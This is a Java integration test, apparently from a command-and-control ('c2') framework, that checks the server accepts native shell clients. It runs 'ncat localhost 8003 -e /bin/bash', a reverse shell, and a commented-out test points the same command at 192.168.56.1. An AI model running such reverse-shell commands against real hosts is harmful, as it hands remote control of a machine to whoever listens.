package c2.nativeshell;

import java.io.IOException;

import org.junit.jupiter.api.Test;

import c2.remote.RemoteTestExecutor;
import util.test.ClientServerTest;
import util.test.RunnerTestGeneric;
import util.test.TestConfiguration;
import util.test.TestConfiguration.OS;
import util.test.TestConstants;

class NcatIntegrationTest extends ClientServerTest {

	@Test
	void test() {
		TestConfiguration.OS thisOS = TestConfiguration.getThisSystemOS();

		try {
			Runtime.getRuntime().exec("ncat");
		} catch (IOException e) {
			System.out.println("ncat not available on this host, skipping ncat integration test sequence");
			return;
		}
		if (thisOS == OS.WINDOWS) {
			initiateServer();
			spawnClient(TestConstants.WINDOWSNATIVE_TEST_EXE);
		} else {
			initiateServer("test_linux.properties");
			spawnClient("ncat localhost 8003 -e /bin/bash");
		}
		RunnerTestGeneric.test(new TestConfiguration(thisOS, "Native", "TCP"));
		awaitClient();
		teardown();

	}
	
	@Test
	void testCrossPlatform() {
		//TODO Implement me!!!
		/*
		initiateServer();
		
		RemoteTestExecutor exec = new RemoteTestExecutor();
		exec.startTestProgram(1005, "ncat 192.168.56.1 8003 -e /bin/bash");
		
		System.out.println("Transmitting commands");
		
		TestConfiguration config = new TestConfiguration(OS.LINUX, "Native", "TCP");
		RunnerTestGeneric.test(config);
		teardown();
		*/
	}

}
